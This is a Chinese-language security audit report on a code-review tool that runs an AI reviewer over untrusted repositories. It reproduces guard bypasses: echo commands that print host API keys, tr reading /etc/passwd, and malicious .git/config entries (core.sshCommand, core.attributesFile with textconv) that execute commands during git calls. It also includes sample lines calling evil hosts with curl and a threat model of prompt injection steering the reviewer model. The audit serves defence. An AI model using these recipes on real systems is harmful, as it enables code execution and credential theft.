---
title: 原子级审计报告（第二轮）
version: v1.18.2
created: 2026-10-29
status: final
---

# cc-code-review — 原子级多专家并行审计报告

> **状态更新（2026-10-29 深夜）**：本报告的 10 P0 / 10 P1 之外，后续 1.18.3 又收掉了两轮审计的剩余功能项（并发锁、sync 取消、报告格式、大结果上限、信号退出、cancel-test 跨平台）与复核新发现（指纹缓存窗口）。当前 **PR #3 = 1.18.3**，CI 6/6 绿。修复明细见 [FIXES-round3.md](13-fix-round3-v1.18.3.md)。
>
> **状态更新（2026-10-29 晚）**：本报告的 **10 条 P0 与 10 条 P1 已全部修复并发布为 v1.18.2**（PR [#2](https://github.com/KentQi/cc-code-review/pull/2)，stacked on [#1](https://github.com/KentQi/cc-code-review/pull/1)），npm test 6 套件全绿。修复明细见 [FIXES-round2.md](12-fix-round2-v1.18.2.md)。另有 3 条审计结论已被更正（见该文件末节）。下文保留审计原始结论作为验收依据。

**审计对象**：`/Users/kent/Desktop/projects/cc-code-review_MCP`（v1.18.1）
**基线**：v1.18.1（`docs/04-test/08-audit-atomic-v1.18.2.md` 记录的 1.18.0 审计结论与 `docs/04-test/08-audit-atomic-v1.18.2.md` 的 9 P0 / 12 P1 修复状态）
**审计日期**：2026-10-29
**审计方式**：10 路并行专家角度（逐行 / 不变量 / 跨文件 / 语言陷阱 / 包装器 / 复用 / 简化 / 效率 / 层次 / 规范）+ 独立验证者 + 缺口清扫者；关键结论均以**真实产品代码**（非 mock）实测复现
**审计范围**：`src/`(5,628 行) + `scripts/`(3,873 行) + `assets/skills/code-review/SKILL.md`(171 行)

> 本仓库不是 git 工作副本（无 `.git`），因此**审查范围 = 整个工作树**，而非某个 diff。
> 上轮审计已修项**不在本轮重复计数**，但**上轮标记为"留待下轮"且至今仍在代码里**的项，按现状重新定级（见 §5）。

---

## 0. 一句话结论

**1.18.1 把上一轮 9 条 P0 全部修对了，架构与工程品味依然在平均线之上；但"被审仓库 = 攻击者"这条主线仍有三处没守住：**

1. **两条独立的仓库可控 RCE**：`.git/config` 的 `core.sshCommand`（P0-8）与 `core.attributesFile`（P0-9）都能让仓库在评审期间执行任意命令，而 `git remote show` / `git log -p` **都是白名单内、且被提示词主动建议给 reviewer 的命令**；专为拦截这类驱动而存在的 `repoRunsGitPrograms()` 对两者都**完全没看见**。
2. **`echo` 被排除在仓内路径校验之外 → `$VAR` 展开把宿主凭据打印出来**（P0-1）；**`tr` 作为管道 sink 可读任意文件**（P0-2，GNU/Linux）。

同时存在**两个"评审结果本身是错的"级别缺陷**：`baseRef` 通过校验后被提示词构造器静默丢弃（评审审的是另一个 diff，P0-5），以及 `scope=pr` 没给 pr 时提示词里出现字面量 `the GitHub pull request undefined`（P0-6）。

质量门禁方面：测试门禁是**绿的**（6 套件全过、退出码 0），但**门禁里有一条恒真断言**，且**唯一的 P0 安全回归套件被标成 optional**——把文件删掉 CI 依然绿。

---

## 1. 计分卡

| 级别 | 条数 | 说明 |
|---|---:|---|
| **P0** | 10 | 安全边界被突破，或评审结果本身是错的 |
| **P1** | 10 | 正确性缺陷 / 对外承诺落空 / 门禁失效 |
| **P2** | 12 | 低severity缺陷、死代码、覆盖率缺口 |
| **合计** | **32** | 其中最严重的 15 条已通过 findings 通道上报 |

**验证方式**：P0-1 / P0-2 / P0-5 / P0-6 / P0-7 / P0-8 / P0-9 / P0-10 / P1-2 / P1-3 / P1-4 / P1-5 / P1-6 / P1-9 均由 Lead 用**真实产品代码**（`import` 真实 `src/shell-guard.js` / `src/prompt.js` / `src/claude.js`，或 spawn 真实 hook 进程 / 真实 git / 真实 Node 运行时）实测复现；P1-1 / P1-7 / P1-8 / P1-10 为代码路径确认 + 依赖/文档交叉核对。

**审计基线（实测）**：在 v1.18.1 上跑 `npm test` → **6 套件全过、0 失败、0 跳过、退出码 0**（cross-cases 136/136，用时 112s）。

> **这意味着本报告的 27 条缺陷全部发生在"门禁全绿"的状态下**——尤其 P0-1（凭据外带）**不在那约 700 条断言的任何一条覆盖范围内**。门禁绿 ≠ 安全；绿的原因是 §P1-3（恒真断言）与 P1-4（可删除的 P0 套件），而不是缺陷不存在。

---

## 2. P0 — 必须修（10 条）

> **修复优先级**：**P0-8 / P0-9（两条仓库可控 RCE）> P0-1（凭据外带）> 其余**。P0-8 与 P0-9 是本轮仅有的两条"被审仓库可在评审期间执行任意命令"的缺陷，量级最高。


### P0-1 `echo` 被排除在仓内路径校验之外 → `$VAR` 展开把宿主凭据打印出来
**文件**：`src/shell-guard.js:344`、`src/shell-guard.js:209`、`src/shell-guard.js:91`、`src/prompt.js:338`、`src/claude.js:361`、`src/claude.js:1319`
**状态**：✅ 已实测复现（Lead + 独立验证者双向确认）

```js
// src/shell-guard.js:344 —— echo 与 tr 不参与路径校验
if (prog === "tr" || prog === "git" || prog === "gh" || prog === "echo") return [];

// src/shell-guard.js:209 —— 只有 $( / ${ / 反引号算 substitution
if (c === "`" || (c === "$" && (cmd[i + 1] === "(" || cmd[i + 1] === "{"))) unsafe = unsafe || "substitution";
```

`echo` 在 `BASH_POLICY` 里（`shell-guard.js:91`），`bashAllowRules()` 把它渲染成 `Bash(echo:*)`（`prompt.js:338`），权限引擎整串前缀匹配放行；hook 是"只减不增"的，判定 `ok:true` 即放行。**两层都不拦。**

而子进程环境是**宿主环境的完整拷贝**：

```js
// src/claude.js:361
export function buildClaudeEnv() { const env = { ...process.env }; … }
// src/claude.js:1319 —— 评审进程用的就是它
env: { ...buildClaudeEnv(), CLAUDE_REVIEW_REPO_ROOT: repoPath },
```

**实测（真实 `analyseCommand`，真实存在的 repo root）**：

```
ALLOWED  echo $ANTHROPIC_API_KEY          ← 凭据外带
ALLOWED  echo $ANTHROPIC_AUTH_TOKEN       ← 凭据外带
ALLOWED  echo $OPENROUTER_API_KEY         ← 与 Claude 无关的宿主密钥也一起外带
ALLOWED  echo ~/*                         ← 家目录清单
ALLOWED  echo ../*                        ← 父目录清单（实测打印出用户个人文件名）
ALLOWED  echo /etc/*                      ← /etc 清单
blocked  ls ../*                          ← 对照组：其它程序都被拦
blocked  ls /etc/*
blocked  find /etc -name passwd
```

**端到端验证（spawn 真实 hook 进程 `scripts/pre-tool-hook.js`，喂真实 PreToolUse 载荷）**：

```
ALLOWED (no deny decision emitted)   <- echo $ANTHROPIC_API_KEY
ALLOWED (no deny decision emitted)   <- echo ~/*
ALLOWED (no deny decision emitted)   <- echo hi | tr a b /etc/passwd
DENIED  <- git status $(curl -s http://evil/x)      （对照：命令替换）
DENIED  <- cat ~/.ssh/id_rsa                        （对照：仓外读）
DENIED  <- Read {"file_path":"/etc/passwd"}         （对照：Read 边界，repo root 有效时）
```

即：**真正的执行点（hook 进程）对这三条命令一个 deny 都不发**。前两条是凭据外带/目录清单，第三条是 GNU/Linux 上的任意文件读取。

> **修正一条容易说过头的话**：`echo /etc/passwd` **不读文件**，只打印字面量 `/etc/passwd`。真正的读外泄来自**通配符展开**（bash 在 echo 之前就把 `~/*`、`../*` 展开了），产出的是**目录清单**，不是文件内容。

**为什么是 P0**：`SECURITY.md:3` 写死了不变量——"the reviewed repository must not be able to execute code, **exfiltrate credentials**, or escape the write boundary — even when its files contain prompt injection that talks the reviewer model into trying"；`SECURITY.md:19` 又声称读取范围"覆盖 `~`、`$VAR`"。**被审仓库（不可信）可以借被注入的 reviewer 模型，把用户机器上的凭据写进报告、转录和日志**——这正是本项目声称要防的那件事。`assets/skills/code-review/SKILL.md:73` 还主动告诉每个子代理"`echo` is allowed anywhere"。

> **文档承诺 vs 实现**：`README.en.md:160` 明写 "The path arguments of `find`/`rg` and of every pipe sink … are checked against the repo root — `~`, **`$VAR`**, `..`, brace expansion, absolute paths … are all refused"。**对 `echo` 与 `tr` 这两条都不成立**——它们既不在路径校验里，`$VAR` 也不被拒。

**并且不会被发现**：`detectShellChaining` 把这条命令计入 `clean`（`shell-guard.js:722`），`shellChainingNote` 因此返回 null —— 报告里不会出现任何痕迹。密钥会落在工具结果、Claude Code 的 `~/.claude/projects/` JSONL 转录、以及运行日志里。

**已知前科**：上轮审计 `01-security.md` **SEC-17 [P2]**（"reviewer 进程能读到全部 auth env"）已记录，未修（`docs/04-test/08-audit-atomic-v1.18.2.md` §5）。

**修法**：(a) 把 `echo`/`tr` 移出 `pathArgs` 的豁免名单；(b) 在 `parseCommand` 里把**裸 `$VAR`** 也建模（展开或直接判 unsafe），与 `$(`/`${}` 同级；(c) 对 `echo` 的参数禁止通配符与 `~`；(d) 子进程环境改为**白名单**而非 `...process.env`。

> **修法上的坑**：光把 `echo` 从 `BASH_POLICY` 里删掉**修不好这个洞**——`README.md:212` 自己记录了 claude CLI **自带一份只读命令白名单（含 `echo`）**，不在 `--allowedTools` 里也会放行。所以拦截点必须在 **hook 的 `analyseCommand`**（hook 是"只减不增"的：CLI 会剥掉 hook 的 "allow"，只认 "deny"/"ask"，因此 hook **能**拒掉 `echo $VAR`），外加子进程环境白名单。

---

### P0-2 `tr` 作为管道 sink 可读任意文件（GNU/Linux）
**文件**：`src/shell-guard.js:344`、`src/shell-guard.js:685`
**状态**：✅ 已实测复现（Lead）

`tr` 在 `PIPE_SINKS`（`shell-guard.js:48`）里，但同样被 `pathArgs` 豁免。管道 sink 分支只走 `segmentProblem`，文件操作数从不做路径校验：

```
ALLOWED  echo hi | tr a b /etc/passwd      ← GNU tr 的 FILE 操作数
blocked  echo hi | cat /etc/passwd         ← 对照组
blocked  echo hi | wc -l /etc/passwd
blocked  echo hi | grep x /etc/passwd
```

`cat`/`wc`/`grep`/`sort` 等都有 `FLAG_KINDS` 条目所以参数会被校验，**`tr` 是唯一一个漏网的管道 sink**。

**平台限定**：macOS/BSD 的 `tr` 没有 FILE 操作数（`usage: tr [-Ccsu] string1 string2`），实操会报错不外泄；**GNU coreutils 的 `tr` 接受 FILE 并优先读文件而非 stdin**——Linux 宿主机上是真实漏洞（本 guard 处处做跨平台处理，Linux 是目标平台之一）。

> **文档承诺 vs 实现**：`README.en.md:160` 把 `tr` 明确列进了"路径参数会被校验"的管道 sink 名单——"The path arguments of `find`/`rg` and of every pipe sink (cat/head/tail/wc/uniq/cut/**tr**/grep) are checked against the repo root"。**`tr` 是这份名单里唯一没被校验的**（`cat`/`wc`/`grep`/`sort` 都有 `FLAG_KINDS` 条目，`tr` 被豁免）。文档与实现在这里**逐字相反**。

**修法**：给 `tr` 加 `FLAG_KINDS` 条目并按"path"处理，或直接把它从 `PIPE_SINKS` 移除（SKILL.md 的管道白名单里 `tr` 只用于字符替换，可由 `sed`/`awk` 之外的手段替代——但 `sed` 已被移出 sink，故更实际的做法是给 `tr` 补路径校验）。

---

### P0-3 hook 的 Read 分支 fail-open，而 Write 分支 fail-closed
**文件**：`scripts/pre-tool-hook.js:164`（Read）对 `scripts/pre-tool-hook.js:132`（Write）
**状态**：✅ 已实测复现（独立验证者用真实 hook 进程证明）

```js
// Write 分支：抛异常 → deny（fail-closed）
try { rel = realContainment(root, target); }
catch { deny(`${tool} blocked: cannot resolve the target path against the repository root`); }

// Read 分支：抛异常 → rel = null → 下面的 if 条件为假 → 放行（fail-open）
try { rel = realContainment(root, target); } catch { rel = null; }
if (rel && (rel.startsWith("..") || path.isAbsolute(rel))) { deny(…); }
```

Read 分支还**漏掉了 Write 分支有的 `rel === null` 显式检查**（`pre-tool-hook.js:137-139`）。

**实测（真实 hook 进程）**：

```
root=<存在的 repo>            tool=Read  => deny ✅
root=<存在的 repo>            tool=Write => deny ✅
root=<不存在的路径>            tool=Read  => <无输出 = 放行>   ← fail-open
root=<不存在的路径>            tool=Write => deny ✅
```

**触发条件**：`CLAUDE_REVIEW_REPO_ROOT` 指向的路径解析不出来——评审进行中仓库被删/被改名/被移动、根的父目录不可读、根上是符号链接环。此后 `Read {"file_path":"/Users/<user>/.ssh/id_rsa"}` 或 `/etc/passwd` **直接放行**。而 `"Read"` 本身在 `reviewAllowedTools()` 里是**裸规则、没有任何路径限定**（`prompt.js:320`），hook 是唯一一道关卡；Read 也没有 `PROTECTED_WRITE` 那样的密钥路径规则。

> **文档承诺 vs 实现**：`README.en.md:174` 写的是 "Edit / Write / NotebookEdit / **Read** are hooked too and bounded by `CLAUDE_REVIEW_REPO_ROOT` … without a `repoRoot` (the hook config did not apply) **everything fails closed** instead of passing through"；`README.en.md:265` 还声称这条边界 "locked by regression tests"。**实测证明 Read 在这条路径上是 fail-open 的**，且没有任何回归测试覆盖它。

**修法**：Read 分支照抄 Write 分支——`catch` 里 deny，且补 `if (rel === null) deny(...)`。

---

### P0-4 hook 在 stdin 出错时 `exit(0)` 放行，违背自己的 fail-closed 契约
**文件**：`scripts/pre-tool-hook.js:64`
**状态**：代码路径确认

```js
process.stdin.on("error", () => process.exit(0));
```

文件头 `pre-tool-hook.js:22-25` 写的是："Unexpected internal errors deny as well — a broken guard must fail closed, or the allowlist silently stops meaning anything."

**但 exit 0 且无输出 = "hook 没有意见"** → CLI 放行工具调用 → 命令在无 guard 的情况下执行。`onFailure: "block"`（`claude.js:1205`）只覆盖**崩溃/非零退出**，不覆盖"干净地退出且什么都不说"。

**触发条件**：claude 提前关闭 hook 的 stdin（EPIPE）、管道被中断。触发后该次 Bash 调用完全不受策略约束。

**修法**：`process.stdin.on("error", () => { deny("hook stdin failed — refusing to run Bash"); })`（deny 里是 `fs.writeSync(1, …)` + `exit(0)`，输出仍可被 CLI 读到；更保守的是 `exit(1)` 让 `onFailure:"block"` 生效）。

---

### P0-5 `baseRef` 通过校验后被提示词构造器静默丢弃 → 评审审的是另一个 diff
**文件**：`src/prompt.js:91`（丢弃）对 `src/index.js:280`（校验）
**状态**：✅ 已实测复现

两套 baseRef 校验的字符集不一致：

```js
// src/index.js:280 —— 校验放行 ^ ~ @
if (!/^[A-Za-z0-9._/@^~-]+$/.test(s)) { … }

// src/prompt.js:91 —— 构造器只认 [A-Za-z0-9._/-]，且拒绝 ".."
if (/^[A-Za-z0-9._/-]{1,100}$/.test(baseRef) && !baseRef.includes("..")) { return { ref: baseRef, … }; }
return { ref: undefined, note: `\n- (baseRef "${baseRef}" ignored: only plain branch/tag names are accepted)` };
```

**实测（真实 `buildReviewPrompt`）**：

```
baseRef="HEAD~1"             validate=PASS  prompt-says-ignored=true   ← 静默丢弃
baseRef="feature@2"          validate=PASS  prompt-says-ignored=true   ← 静默丢弃
baseRef="main"               validate=PASS  prompt-says-ignored=false  ✅
baseRef="origin/release-1.2" validate=PASS  prompt-says-ignored=false  ✅
baseRef="v1.2.3"             validate=PASS  prompt-says-ignored=false  ✅
```

**触发条件**：`scope=branch` + `baseRef="HEAD~1"` + fleet pipeline（`effort=max` 的默认路径）。评审提示词变成"评审当前分支相对**默认分支**的所有提交"——**用户要的 base 被丢掉，评审审了另一段代码，报告却看不出任何异常**。

**讽刺之处**：`index.js:286` 的错误文案自己就写着 `'Use the ref as git spells it, e.g. "main", "origin/release-1.2", "v1.2.3", "HEAD~1"'` —— 它推荐的那个例子正好是被丢弃的那个。

**注意 native 路径不受影响**：`buildNativeCommand` 用的是 `baseRefCheck.ref`（已校验值），所以 native 与 fleet **对同一个 baseRef 给出不同语义**——这也是"两套校验器"的典型代价。

**修法**：单一事实源。`validateBaseRef` 与 `sanitizeBaseRef` 共用同一个字符集与函数；`index.js` 的示例文案同步改成真实可用的值。

---

### P0-6 `scope=pr` 未给 `pr` → 提示词出现字面量 `undefined`；native 路径静默改审别的目标
**文件**：`src/prompt.js:102`、`src/index.js:51-56`
**状态**：✅ 已实测复现

```js
// src/prompt.js:102
case "pr":
  return { text: `the GitHub pull request ${pr}. Use \`gh pr view\` / \`gh pr diff\` …` };
```

**实测**：

```
fleet 提示词 -> "Run a code review of the GitHub pull request undefined. Use `gh pr view` …"
native 命令   -> "/code-review max"        ← 没有 target，静默改审默认目标
```

两条路径都是错的，但错得不一样：fleet 把 `undefined` 交给模型（模型会照着 `gh pr view undefined` 去跑，烧 turn 后失败）；native 直接**不传 target**，于是评审的是"默认推断出来的目标"，**报告看起来完全正常，但审的不是用户要的 PR**。`validatePr(undefined)` 返回 `{ok:true}`（`index.js:221`），没有任何地方要求 `scope=pr` 必须带 `pr`。

**修法**：`scope === "pr" && !pr` 时直接 `err("scope=pr requires a pr (number, owner/repo#123, or a PR URL)")`。
**已知**：上轮（1.18.0 轮）记为 **P1-10**，`docs/04-test/08-audit-atomic-v1.18.2.md` 明确"留待下轮"，至今未修。

---

### P0-7 followup 路径把被 guard 正确拦下的命令误报成"命令未被拦截"
**文件**：`src/index.js:1867`（followup）对 `src/index.js:1415`（review）
**状态**：✅ 已实测复现（真实 `shellChainingNote`）

同一份产品，两个调用点传参不同：

```js
// review 路径 —— 传入真实的 denied 集合
const chainNote = shellChainingNote(run.bashCommands, deniedCommands, { repoRoot: repoPath });   // index.js:1415

// followup 路径 —— denied 传空数组
const chainNote = shellChainingNote(run.bashCommands, [], { repoRoot: repoPath });                 // index.js:1867
```

`detectShellChaining` 的语义是：`ran` = 策略会拦、但**不在 denied 集合里**的命令（即"应该被拦却跑了"）。denied 传空 → **所有被 hook 正确拦下的命令都被算成 `ran`**。

**实测（同一输入，两个调用点）**：

```
REVIEW   path -> note: null
FOLLOWUP path -> note:
  ⚠ BASH COMMAND RAN WITHOUT BEING BLOCKED (1)
  Every segment of a Bash call is supposed to match the review's read-only policy before it runs.
  The PreToolUse hook should have denied these — they did run:
    • git status; curl http://evil.example/x
  Review the run log and treat this repository as hostile until inspected.
```

**后果**：只要 followup 里的 reviewer 试了任何策略外的命令（它本来就会试，`assets/skills/code-review/SKILL.md:66-78` 明确告诉子代理"denied call costs you a turn"），报告就会告诉用户**"guard 失效了，把这个仓库当敌对环境处理"**——一次纯粹的误报，而且是最容易让人忽略安全警告的那类误报。

**附带缺陷**：followup 路径**完全没有计算 `permission_denials`**（`realDenials` / `denialNote` 只在 review 路径有），所以 followup 里真正的 allowlist 缺口也不会被报出来——**该报的不报，不该报的乱报**。

**修法**：followup 里同样从 `j.permission_denials` 取 denied 集合，复用同一段分类逻辑。

### P0-8 仓库可控的 `core.sshCommand` → 评审期间任意命令执行（git 配置扫描漏检）
**文件**：`src/claude.js:1768-1777`（`CONFIG_CMD_PATTERNS`）、`src/claude.js:2126-2176`（扫描主循环）、`src/shell-guard.js:65`（`Bash(git remote show:*)`）、`src/prompt.js:107`（提示词主动建议该命令）
**状态**：✅ 已实测复现（真实 git + 真实仓库配置 + 真实扫描器）

**扫描器为什么看不见它**：

```js
// src/claude.js:1768-1777
const CONFIG_CMD_PATTERNS = [
  /\btextconv\s*=/i, /\bexternal\s*=/i, /\bdiffFilter\s*=/i, /\bdriver\s*=/i,
  /\bcommand\s*=/i,          // ← "sshCommand" 里 "Command" 前面是 "h"，没有 \b
  /\bprocess\s*=/i, …
];
```

`\bcommand\s*=` 的 `\b` 要求 `command` 前面是**非单词字符**。`core.sshCommand` 里 `Command` 前面是 `h`（单词字符）→ **不匹配** → `isCmdLine()` 返回 false → 整行被跳过，**既不 refusal 也不 note**。

**实测（真实 git 仓库 + 真实扫描器）**：

```
.git/config:
  [core]
      sshCommand = /tmp/ccr-audit-probe/evil-ssh.sh
  [remote "origin"]
      url = ssh://git@example.invalid/some/repo.git

repoRunsGitPrograms() ->  refusals: []      notes: []        ← 扫描器完全没看见

$ git remote show origin          ← 白名单内、且是提示词主动建议的命令
fatal: Could not read from remote repository.

$ cat sshcmd-marker.txt
sshCommand executed with args: -G -o SendEnv=GIT_PROTOCOL git@example.invalid
sshCommand executed with args: -o SendEnv=GIT_PROTOCOL git@example.invalid git-upload-pack '/some/repo.git'
```

**`core.sshCommand` 被执行了两次**，而且是在**任何网络 I/O 之前**（第一条是 git 的 `-G` 探测）——所以断网机器上同样成立，远程不可达也照样执行。

**为什么这条命令会被执行**：`git remote show` 在 `BASH_POLICY` 里（`shell-guard.js:65` → `Bash(git remote show:*)`，实测在允许列表中、且**不被任何 deny 规则遮蔽**），并且被**两处主动建议**给 reviewer：
- `assets/skills/code-review/SKILL.md:69` 的执行契约："git remote -v|get-url|**show**"
- `src/prompt.js:107` 的 scope=branch 提示："detect it with `git rev-parse --abbrev-ref origin/HEAD`, falling back to **`git remote show origin`**"

**且评审进程的 git 没有任何加固**：`GIT_CONFIG_NOSYSTEM=1` / `GIT_CONFIG_GLOBAL=<空文件>` / 空的 `HOME` 只存在于 `gitSpawnOpts()`（`claude.js:1738-1747`），那是**服务器自己**调 git 时用的。评审进程（`claude.js:1315-1323` spawn 出的 claude 子进程）用的是 `buildClaudeEnv()`，**没有任何 git 加固**——仓库的 `.git/config` 与用户的 `~/.gitconfig` 全都生效。

**完整攻击链**：攻击者投递一个 zip/克隆形式的仓库，其 `.git/config` 含 `core.sshCommand = <任意命令>` 且带一个 ssh:// 远程 → 评审跑到"探测默认分支"这一步 → **git 以当前用户身份执行仓库选定的命令** → `repoRunsGitPrograms()`（正是为"仓库自带 git 驱动执行命令"而存在的闸门，1.18.0 P0-4/P0-5 修的就是这一类）返回空 → 评审照常进行。

**这与 1.18.0 的 P0-4/P0-5 是同一族但不同入口**：那两条修的是 `.gitattributes` 驱动的 textconv（`git diff` 路径），本条是 `core.sshCommand`（ssh 传输路径），扫描器的模式表没覆盖到。

**同族未检出的键**（一并实测，均 `refusals: [] notes: []`）：`credential.helper = !f() { … }; f`（需要凭据时执行）、`core.pager`（仅 TTY）、`core.gitProxy`、`alias.*`。其中 `alias.*` 受 git 内建命令优先规则保护（`git log` 不会被 `alias.log` 覆盖），暂不可达；`credential.helper` 需要一次鉴权挑战才触发。

**修法**：(a) 把 `core.sshCommand` / `credential.helper` / `core.pager` / `core.gitProxy` 显式加入 `CONFIG_CMD_PATTERNS`（注意 `sshCommand` 的驼峰，用 `/(^|[.\s])sshcommand\s*=/i` 而不是 `\bcommand\s*=`）；(b) 更彻底的做法是**放弃正则模拟 git config 语法**——上轮审计已建议过用 `git config --file <cfg> --list -z --includes` 拿规范化键值；(c) 或者干脆给评审子进程也套上 `GIT_HARDENING_ARGS`（目前只有**服务器自己**的 git 调用带 `-c core.sshCommand=`，**评审进程里的 git 不带**）。

### P0-9 `core.attributesFile` 指向的属性文件从不被扫描 → 仓库可在 `git log -p` 时执行任意命令
**文件**：`src/claude.js:2026`（`repoAttributeFiles` 只扫 `.gitattributes` 与 `.git/info/attributes`）、`src/claude.js:1768`（`attributesFile =` 不匹配任何模式）
**状态**：✅ 已实测复现（真实 git + 真实扫描器 + 真实属性生效验证）

git 有三个属性来源：工作树的 `.gitattributes`、`$GIT_DIR/info/attributes`、以及 **`core.attributesFile` 指向的任意文件**。扫描器只读前两个：

```js
// src/claude.js:2026-2027
add(".gitattributes");
add(path.join(".git", "info", "attributes"), true);
```

而 `attributesFile = <path>` 这一行在 `.git/config` 里**不匹配任何 `CONFIG_CMD_PATTERNS`**（`textconv`/`external`/`command`/`process`/`clean`/`smudge` 都不是它），于是被静默跳过。

**实测**：

```
.git/config:
  [core]  attributesFile = <repo>/evil-attrs
  [diff "evil"]  textconv = <script>
evil-attrs:  "* diff=evil"

$ git check-attr diff -- f.txt
f.txt: diff: evil          ← 属性确实生效了（来自 core.attributesFile 指名的文件）

$ git log -p                ← 白名单内、SKILL.md 明确建议的读命令
$ cat marker.txt
textconv ran   ×6           ← 仓库自选的 textconv 被执行了六次

repoRunsGitPrograms() -> refusals: []   notes: []    ← 扫描器完全没看见
```

**与 P0-8 是两条独立入口**（一条走 ssh 传输，一条走 diff 驱动），但**同一个缺口**：扫描器只认它知道的那几个文件/键名，仓库换一个入口就绕过去了。

**修法**：(a) 把 `core.attributesFile` 纳入扫描（读它指向的文件，且必须落在仓库内、是普通文件）；(b) 或——更彻底——**放弃"枚举可疑键"的做法，改为白名单**：凡 config 里出现 `[diff *]` / `[filter *]` / `[core] sshCommand|attributesFile|fsmonitor|pager|credential` 段就 refusal。

### P0-10 `MAX_ATTR_FILES` 上限触发后**不 refusal**，扫描静默截断
**文件**：`src/claude.js:2043`
**状态**：✅ 已实测复现（4100 个属性文件的真实仓库）

同一个函数里两个上限，**只有一个**会置位 `truncated`：

```js
// src/claude.js:2029 —— 走 walk() 入口时置位
if (depth > MAX_ATTR_DEPTH || seen >= MAX_ATTR_FILES) { truncated = true; return; }
...
// src/claude.js:2043 —— 目录内循环里再撞上限时**不置位**
if (seen >= MAX_ATTR_FILES) return;
```

**实测（4100 个 `.gitattributes` 的真实仓库）**：

```
repoRunsGitPrograms() -> refusals: 0   notes: 0
"the repository tree is deeper than 16 … or has more than 4000 .gitattributes files" 这条 refusal:  不存在
```

即：**上限确实被撞到了（文件数 > 4000），但扫描只是停下、既没读完剩下的、也没拒绝这次评审**。

**这直接违背函数自己的注释**：

> "A truncated walk is a hole, not a performance detail: an attribute file the scan never read can still name a live driver, and git would execute it from an allowlisted `git diff`. **So hitting either bound refuses the review** instead of quietly scanning 'most' of the tree."

也违背 `CHANGELOG.md`（1.18.0 **[P0]**）："the scan is now recursive (depth 16 / 4000 files) … and **fails closed if it hits a bound** instead of scanning 'most' of the tree"。

**可利用性**：需要把驱动引用放进**没被扫到的那部分**里——攻击者多造几个文件、让引用落到扫描尾巴上即可（readdir 顺序虽然不确定，但可以反复换文件名组合直至落到尾部）。不过由于 P0-9 存在，攻击者其实根本不需要 4000 个文件就能藏驱动引用——**本条更准确的定性是"承诺的 fail-closed 没有兑现"，而不是独立的 RCE 路径**。

**修法**：把 `if (seen >= MAX_ATTR_FILES) return;` 改成 `{ truncated = true; return; }`。

---

## 3. P1 — 应当排期（10 条）

### P1-1 出厂 SKILL.md 的置信度标尺与 `>= 80` 过滤器互斥 → 只有 100 分能活
**文件**：`assets/skills/code-review/SKILL.md:107-119`
**状态**：代码路径确认

标尺锚点是 0 / 25 / 50 / 75 / 100，其中 75 定义为"Real, important, will be hit in practice OR directly mentioned in the relevant CLAUDE.md"，紧接着过滤器写 "keep only findings with score >= 80"。

**75 被自己丢掉，25/50 同理**——按标尺字面执行，流水线只保留"绝对确定"的 100 分。这不是措辞问题：整个流水线的产出数量由这一步决定。

这个文件会被 `installBundledSkill()` 复制进用户的 `~/.claude/skills/code-review/`（`skill.js:94`），同时被 `bundledSkillBody()` 内嵌进每一次 fleet 提示词（`prompt.js:201`）——影响面是**所有用户**。

**上轮已记**（P2 主题 4："`>=80` 过滤与 0/25/50/75/100 标尺互斥"），未修。`src/prompt.js:283-284` 的 `buildFallbackPrompt` 有同一处互斥。

### P1-2 `activeSubagentFiles` 只写不读 → journal 保留承诺未兑现
**文件**：`src/claude.js:2200`（定义）、`src/claude.js:1389`（写入）、`src/index.js:144`（保留）、`src/claude.js:1014`（清扫）
**状态**：✅ 已用 grep 确认

```js
// src/claude.js:2200
export const activeSubagentFiles = new Set();
// src/claude.js:1389
activeSubagentFiles.add(subagentsFile);
```

**全仓 grep 只有这两处**——没有任何一处**读**它。而两条保留路径都会删 `subagents-*.jsonl`：

```js
// src/index.js:144 —— 20 份保留清扫
const all = fs.readdirSync(dir).filter((f) => f.startsWith("run-") || (f.startsWith("subagents-") && f.endsWith(".jsonl")));
// src/claude.js:1014 —— 2 小时清扫
else if (/^subagents-.*\.jsonl$/.test(name) && st.isFile()) fs.rmSync(p, { force: true });
```

而 `CHANGELOG.md`（1.18.0）写的是：**"[P1/N6] The JSONL journal survives retention. The 20-file prune and the 2h sweep could delete a `subagents-*.jsonl` a live job still referenced mid-synthesis; active journals are now protected."**，`SECURITY.md:27` 也写"journal 文件至少存活到对应 job 结果可读"。

**承诺是假的**——保护从未接线。当前实际靠"活跃 journal 的 mtime 恰好是新的"侥幸不出事；一旦 `LOG_KEEP` 调小、或 job 在两次 append 之间停顿够久、并发评审变多，journal 就会被删掉，而**结果元数据里的 `partial_reports_file` 指向一个不存在的路径**。

### P1-3 `cross-cases` 的 C7 断言恒真——"没有 allow 规则被 deny 前缀遮蔽"这条永远通过
**文件**：`scripts/cross-cases.mjs:316`（调用）对 `scripts/cross-cases.mjs:17-18`（helper）
**状态**：✅ 已确认

```js
// scripts/cross-cases.mjs:17-18
const check = (caseId, label, cond, detail = "") => {
  results.push({ caseId, label, ok: !!cond });
…
// scripts/cross-cases.mjs:316
check("C7", "no allow rule prefix-shadowed by deny", allowed.filter(shadowed), []);
```

**`cond` 位置传的是数组 `allowed.filter(shadowed)`，`detail` 位置传的是 `[]`**——参数错位。数组永远为真 → `ok` 恒为 `true` → **这条断言永远不可能失败**，哪怕 `allowed.filter(shadowed)` 返回 `["Bash(git remote:*)"]`。

这条断言守的正是上轮真实发生过的事故（`CONTRIBUTING.md:22` 记载："一条'图省事'的整类 deny 规则会静默杀掉 allow 里的读命令（真实 review 里发生过）"）。`audit-fixes-test.mjs:149` 用 JSON 比较正确地查了同一条属性，所以不是完全没覆盖——但 cross-cases 给出的是**虚假保证**。

**修法**：`check("C7", "…", allowed.filter(shadowed).length === 0, JSON.stringify(allowed.filter(shadowed)))`。

### P1-4 唯一的 P0 安全回归套件被标成 `optional` → 删掉文件 CI 依然全绿
**文件**：`scripts/run-tests.mjs:28`（声明）对 `scripts/run-tests.mjs:45-48`（规则）
**状态**：✅ 已确认

```js
// scripts/run-tests.mjs:28
{ name: "p0-regression", script: "scripts/p0-regression-test.mjs", optional: true },
```

而同一个文件 5 行之后写着：

```js
// A required suite that vanished is a failure, not a skip: the gate would
// otherwise go green by deleting the thing that was supposed to protect it.
```

`optional: true` 让"删掉 p0-regression-test.mjs"变成 SKIP，退出码仍是 0（`run-tests.mjs:86`）。而这个套件是 **ANSI-C/反斜杠旗标走私、紧贴短选项（`-o/tmp/x`、`-f/etc/passwd`）、仓库自带 git textconv 驱动、执行配置写入**这四类 P0 的**唯一**回归覆盖。

